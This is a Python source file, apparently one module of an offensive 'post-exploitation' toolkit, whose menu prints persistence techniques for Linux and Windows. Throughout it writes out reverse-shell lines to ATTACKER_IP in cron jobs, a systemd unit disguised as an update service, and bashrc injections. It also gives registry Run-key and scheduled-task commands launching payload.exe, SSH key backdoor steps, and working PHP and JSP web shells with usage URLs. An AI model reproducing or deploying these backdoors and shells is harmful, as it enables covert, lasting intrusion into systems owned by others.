#!/usr/bin/env python3
# app/post_exploitation/persistence.py

import os
import sys
import platform

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE
from utils import Logger, pause, InputValidator, clear_screen


class Terminal:
    MARGIN = 4
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()


class Persistence:
    def __init__(self):
        self.os_type = platform.system().lower()
    
    def show_header(self):
        clear_screen()
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}╔════════════════════════════════════════╗{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}║       PERSISTENCE MECHANISMS           ║{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}╚════════════════════════════════════════╝{C_RESET}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_INFO}  OS: {self.os_type.upper()}{C_RESET}")
        Terminal.print_margin()
    
    def run(self):
        while True:
            self.show_header()
            
            Terminal.print_margin(f"{C_TITLE}┌─ PERSISTENCE MECHANISMS ────────────┐{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  LINUX METHODS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [1]  Cron Jobs{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [2]  Systemd Services{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [3]  Bashrc/Profile Injection{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [4]  SSH Authorized Keys{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  WINDOWS METHODS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [5]  Registry Run Keys{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [6]  Scheduled Tasks{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [7]  Startup Folder{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  WEB SHELLS:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [8]  PHP Web Shell{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [9]  JSP Web Shell{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└─────────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.cron_persistence()
            elif choice == '2':
                self.systemd_persistence()
            elif choice == '3':
                self.bashrc_persistence()
            elif choice == '4':
                self.ssh_keys_persistence()
            elif choice == '5':
                self.registry_persistence()
            elif choice == '6':
                self.scheduled_tasks()
            elif choice == '7':
                self.startup_folder()
            elif choice == '8':
                self.php_webshell()
            elif choice == '9':
                self.jsp_webshell()
            else:
                Logger.error("Invalid choice!")
                pause()
    
    def cron_persistence(self):
        """Cron job persistence"""
        if self.os_type != 'linux':
            Logger.warning("This is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Cron Job Persistence")
        Terminal.print_margin()
        
        Logger.info("Current cron jobs:")
        os.system("crontab -l 2>/dev/null")
        Terminal.print_margin()
        
        Logger.info("Example persistence cron job:")
        Terminal.print_margin(f"{C_OK}# Run reverse shell every hour{C_RESET}")
        Terminal.print_margin(f"0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Run at reboot{C_RESET}")
        Terminal.print_margin(f"@reboot /tmp/.hidden_script.sh")
        Terminal.print_margin()
        
        Logger.info("To add: crontab -e")
        Logger.info("System-wide: /etc/crontab, /etc/cron.d/")
        
        pause()
    
    def systemd_persistence(self):
        """Systemd service persistence"""
        if self.os_type != 'linux':
            Logger.warning("This is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Systemd Service Persistence")
        Terminal.print_margin()
        
        service_content = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        Logger.info("Example systemd service file:")
        Terminal.print_margin(f"{C_OK}File: /etc/systemd/system/update-service.service{C_RESET}")
        Terminal.print_margin()
        print(service_content)
        Terminal.print_margin()
        
        Logger.info("Commands:")
        Terminal.print_margin("  systemctl daemon-reload")
        Terminal.print_margin("  systemctl enable update-service")
        Terminal.print_margin("  systemctl start update-service")
        
        pause()
    
    def bashrc_persistence(self):
        """Bashrc/Profile injection"""
        if self.os_type != 'linux':
            Logger.warning("This is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Bashrc/Profile Persistence")
        Terminal.print_margin()
        
        Logger.info("Target files:")
        files = [
            "~/.bashrc",
            "~/.bash_profile",
            "~/.profile",
            "/etc/profile",
            "/etc/bash.bashrc",
        ]
        
        for f in files:
            Terminal.print_margin(f"  • {f}")
        
        Terminal.print_margin()
        Logger.info("Example payload:")
        Terminal.print_margin(f"{C_OK}# Hidden at end of file:{C_RESET}")
        Terminal.print_margin(f"if [ -f /tmp/.hidden ]; then bash /tmp/.hidden; fi")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_OK}# Or direct reverse shell:{C_RESET}")
        Terminal.print_margin(f"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &")
        
        pause()
    
    def ssh_keys_persistence(self):
        """SSH authorized keys persistence"""
        if self.os_type != 'linux':
            Logger.warning("This is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("SSH Authorized Keys Persistence")
        Terminal.print_margin()
        
        Logger.info("1. Generate SSH key pair:")
        Terminal.print_margin("  ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key")
        Terminal.print_margin()
        
        Logger.info("2. Add public key to target:")
        Terminal.print_margin("  File: ~/.ssh/authorized_keys")
        Terminal.print_margin("  Append your public key")
        Terminal.print_margin()
        
        Logger.info("3. Connect:")
        Terminal.print_margin("  ssh -i persistence_key user@target")
        Terminal.print_margin()
        
        Logger.info("Target locations:")
        Terminal.print_margin("  /root/.ssh/authorized_keys")
        Terminal.print_margin("  /home/*/.ssh/authorized_keys")
        
        pause()
    
    def registry_persistence(self):
        """Windows registry persistence"""
        self.show_header()
        Logger.info("Windows Registry Persistence")
        Terminal.print_margin()
        
        Logger.info("Common registry run keys:")
        Terminal.print_margin()
        
        keys = [
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ]
        
        for key in keys:
            Terminal.print_margin(f"  • {key}")
        
        Terminal.print_margin()
        Logger.info("Example command:")
        Terminal.print_margin(r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe"')
        
        pause()
    
    def scheduled_tasks(self):
        """Windows scheduled tasks"""
        self.show_header()
        Logger.info("Windows Scheduled Tasks Persistence")
        Terminal.print_margin()
        
        Logger.info("Create scheduled task:")
        Terminal.print_margin()
        
        cmd = r'schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru System'
        Terminal.print_margin(cmd)
        Terminal.print_margin()
        
        Logger.info("Other triggers:")
        Terminal.print_margin("  /sc daily     - Daily")
        Terminal.print_margin("  /sc hourly    - Every hour")
        Terminal.print_margin("  /sc onstart   - At startup")
        Terminal.print_margin("  /sc onlogon   - At logon")
        
        pause()
    
    def startup_folder(self):
        """Windows startup folder"""
        self.show_header()
        Logger.info("Windows Startup Folder Persistence")
        Terminal.print_margin()
        
        Logger.info("Startup folder locations:")
        Terminal.print_margin()
        
        folders = [
            r"C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
        ]
        
        for folder in folders:
            Terminal.print_margin(f"  • {folder}")
        
        Terminal.print_margin()
        Logger.info("Simply copy your payload to these folders")
        Logger.info("It will execute on user login or system startup")
        
        pause()
    
    def php_webshell(self):
        """PHP web shell"""
        self.show_header()
        Logger.info("PHP Web Shell")
        Terminal.print_margin()
        
        Logger.info("Simple PHP web shell:")
        Terminal.print_margin()
        
        webshell = """<?php
// Simple command execution
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// File upload
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>"""
        
        print(webshell)
        Terminal.print_margin()
        
        Logger.info("Usage:")
        Terminal.print_margin("  http://target.com/shell.php?cmd=whoami")
        Terminal.print_margin()
        
        Logger.info("Better alternatives:")
        Terminal.print_margin("  • b374k shell")
        Terminal.print_margin("  • WSO shell")
        Terminal.print_margin("  • c99 shell")
        Terminal.print_margin("  • r57 shell")
        
        pause()
    
    def jsp_webshell(self):
        """JSP web shell"""
        self.show_header()
        Logger.info("JSP Web Shell")
        Terminal.print_margin()
        
        Logger.info("Simple JSP web shell:")
        Terminal.print_margin()
        
        webshell = """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null) {
            out.println(line);
        }
    }
%>"""
        
        print(webshell)
        Terminal.print_margin()
        
        Logger.info("Usage:")
        Terminal.print_margin("  http://target.com/shell.jsp?cmd=whoami")
        
        pause()


if __name__ == "__main__":
    persist = Persistence()
    persist.run()